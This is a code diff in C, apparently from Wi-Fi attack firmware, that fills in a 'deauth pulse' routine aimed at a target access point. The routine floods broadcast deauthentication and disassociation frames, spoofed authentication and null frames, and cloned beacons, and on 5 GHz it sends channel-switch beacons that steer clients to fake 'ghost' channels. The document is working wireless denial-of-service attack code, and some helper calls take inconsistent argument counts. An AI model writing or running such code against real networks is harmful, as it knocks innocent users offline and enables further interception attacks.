@@ -37,3 +37,23 @@ static uint32_t _sendDeauthPulseForTarget(uint8_t* bssid, const char* ssid, bool
         (uint8_t)mac_seq,
         0xAA
     };
+
+    uint32_t sent = 0;
+    if (is_5g) {
+        if (wifi_tx_deauth_nav(bssid, kBcastMac, reason)) sent++;
+        uint8_t ghost_ch = kCsaGhostChannels[csa_idx % sizeof(kCsaGhostChannels)];
+        csa_idx++;
+        if (wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch)) sent++;
+        if (wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch)) sent++;
+    }
+
+    if (wifi_tx_deauth_frame(bssid, kBcastMac, reason)) sent++;
+    if (wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid)) sent++;
+    if (wifi_tx_disassoc_frame(bssid, kBcastMac, reason)) sent++;
+    if (wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid)) sent++;
+    if (wifi_tx_null_frame(bssid, kBcastMac)) sent++;
+    if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
+    if (wifi_tx_beacon_frame(bssid, kBcastMac, ssid)) sent++;
+    if (wifi_tx_deauth_frame(bssid, kBcastMac, reason)) sent++;
+    if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
+
